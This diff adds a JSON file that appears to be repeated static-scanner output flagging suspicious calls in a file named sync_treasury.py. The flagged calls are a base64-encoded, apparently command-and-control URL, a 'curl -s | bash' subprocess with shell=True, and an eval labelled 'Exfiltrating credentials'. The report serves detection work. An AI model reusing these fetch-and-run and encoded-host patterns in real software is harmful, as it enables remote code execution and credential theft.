@@ -1,0 +1,250 @@
+[
+    {
+        "total_files": 1,
+        "files": [
+            {
+                "file_path": "./core/data/output/files/sync_treasury.py",
+                "findings": [
+                    {
+                        "type": "Call",
+                        "function": "base64.b64decode",
+                        "args": "aHR0cHM6Ly9hddOjY2tlcnEtYzIuZGFya3dlLm5vdGUub3JnL21vdXBlLmNo",
+                        "kwargs": "",
+                        "line": 14
+                    },
+                    {
+                        "type": "Call",
+                        "function": "subprocess.Popen",
+                        "args": "curl -s  | bash",
+                        "kwargs": "shell:True",
+                        "line": 18
+                    },
+                    {
+                        "type": "Call",
+                        "function": "eval",
+                        "args": "print('Exfiltrating credentials...')",
+                        "kwargs": "",
+                        "line": 21
+                    }
+                ]
+            }
+        ]
+    },
+    {
+        "total_files": 1,
+        "files": [
+            {
+                "file_path": "./core/data/output/files/sync_treasury.py",
+                "findings": [
+                    {
+                        "type": "Call",
+                        "function": "base64.b64decode",
+                        "args": "aHR0cHM6Ly9hddOjY2tlcnEtYzIuZGFya3dlLm5vdGUub3JnL21vdXBlLmNo",
+                        "kwargs": "",
+                        "line": 14
+                    },
+                    {
+                        "type": "Call",
+                        "function": "subprocess.Popen",
+                        "args": "curl -s  | bash",
+                        "kwargs": "shell:True",
+                        "line": 18
+                    },
+                    {
+                        "type": "Call",
+                        "function": "eval",
+                        "args": "print('Exfiltrating credentials...')",
+                        "kwargs": "",
+                        "line": 21
+                    }
+                ]
+            }
+        ]
+    },
+    {
+        "total_files": 1,
+        "files": [
+            {
+                "file_path": "./core/data/outputs/files/sync_treasury.py",
+                "findings": [
+                    {
+                        "type": "Call",
+                        "function": "base64.b64decode",
+                        "args": "aHR0cHM6Ly9hddOjY2tlcnEtYzIuZGFya3dlLm5vdGUub3JnL21vdXBlLmNo",
+                        "kwargs": "",
+                        "line": 14
+                    },
+                    {
+                        "type": "Call",
+                        "function": "subprocess.Popen",
+                        "args": "curl -s  | bash",
+                        "kwargs": "shell:True",
+                        "line": 18
+                    },
+                    {
+                        "type": "Call",
+                        "function": "eval",
+                        "args": "print('Exfiltrating credentials...')",
+                        "kwargs": "",
+                        "line": 21
+                    }
+                ]
+            }
+        ]
+    },
+    {
+        "total_files": 1,
+        "files": [
+            {
+                "file_path": "./core/outputs/files/sync_treasury.py",
+                "findings": [
+                    {
+                        "type": "Call",
+                        "function": "base64.b64decode",
+                        "args": "aHR0cHM6Ly9hddOjY2tlcnEtYzIuZGFya3dlLm5vdGUub3JnL21vdXBlLmNo",
+                        "kwargs": "",
+                        "line": 14
+                    },
+                    {
+                        "type": "Call",
+                        "function": "subprocess.Popen",
+                        "args": "curl -s  | bash",
+                        "kwargs": "shell:True",
+                        "line": 18
+                    },
+                    {
+                        "type": "Call",
+                        "function": "eval",
+                        "args": "print('Exfiltrating credentials...')",
+                        "kwargs": "",
+                        "line": 21
+                    }
+                ]
+            }
+        ]
+    },
+    {
+        "total_files": 1,
+        "files": [
+            {
+                "file_path": "./core/outputs/files/sync_treasury.py",
+                "findings": [
+                    {
+                        "type": "Call",
+                        "function": "base64.b64decode",
+                        "args": "aHR0cHM6Ly9hddOjY2tlcnEtYzIuZGFya3dlLm5vdGUub3JnL21vdXBlLmNo",
+                        "kwargs": "",
+                        "line": 14
+                    },
+                    {
+                        "type": "Call",
+                        "function": "subprocess.Popen",
+                        "args": "curl -s  | bash",
+                        "kwargs": "shell:True",
+                        "line": 18
+                    },
+                    {
+                        "type": "Call",
+                        "function": "eval",
+                        "args": "print('Exfiltrating credentials...')",
+                        "kwargs": "",
+                        "line": 21
+                    }
+                ]
+            }
+        ]
+    },
+    {
+        "total_files": 1,
+        "files": [
+            {
+                "file_path": "./core/outputs/files/sync_treasury.py",
+                "findings": [
+                    {
+                        "type": "Call",
+                        "function": "base64.b64decode",
+                        "args": "aHR0cHM6Ly9hddOjY2tlcnEtYzIuZGFya3dlLm5vdGUub3JnL21vdXBlLmNo",
+                        "kwargs": "",
+                        "line": 14
+                    },
+                    {
+                        "type": "Call",
+                        "function": "subprocess.Popen",
+                        "args": "curl -s  | bash",
+                        "kwargs": "shell:True",
+                        "line": 18
+                    },
+                    {
+                        "type": "Call",
+                        "function": "eval",
+                        "args": "print('Exfiltrating credentials...')",
+                        "kwargs": "",
+                        "line": 21
+                    }
+                ]
+            }
+        ]
+    },
+    {
+        "total_files": 1,
+        "files": [
+            {
+                "file_path": "./core/outputs/files/sync_treasury.py",
+                "findings": [
+                    {
+                        "type": "Call",
+                        "function": "base64.b64decode",
+                        "args": "aHR0cHM6Ly9hddOjY2tlcnEtYzIuZGFya3dlLm5vdGUub3JnL21vdXBlLmNo",
+                        "kwargs": "",
+                        "line": 14
+                    },
+                    {
+                        "type": "Call",
+                        "function": "subprocess.Popen",
+                        "args": "curl -s  | bash",
+                        "kwargs": "shell:True",
+                        "line": 18
+                    },
+                    {
+                        "type": "Call",
+                        "function": "eval",
+                        "args": "print('Exfiltrating credentials...')",
+                        "kwargs": "",
+                        "line": 21
+                    }
+                ]
+            }
+        ]
+    },
+    {
+        "total_files": 1,
+        "files": [
+            {
+                "file_path": "./core/outputs/files/sync_treasury.py",
+                "findings": [
+                    {
+                        "type": "Call",
+                        "function": "base64.b64decode",
+                        "args": "aHR0cHM6Ly9hddOjY2tlcnEtYzIuZGFya3dlLm5vdGUub3JnL21vdXBlLmNo",
+                        "kwargs": "",
+                        "line": 14
+                    },
+                    {
+                        "type": "Call",
+                        "function": "subprocess.Popen",
+                        "args": "curl -s  | bash",
+                        "kwargs": "shell:True",
+                        "line": 18
+                    },
+                    {
+                        "type": "Call",
+                        "function": "eval",
+                        "args": "print('Exfiltrating credentials...')",
+                        "kwargs": "",
+                        "line": 21
+                    }
+                ]
+            }
+        ]
+    }
+]
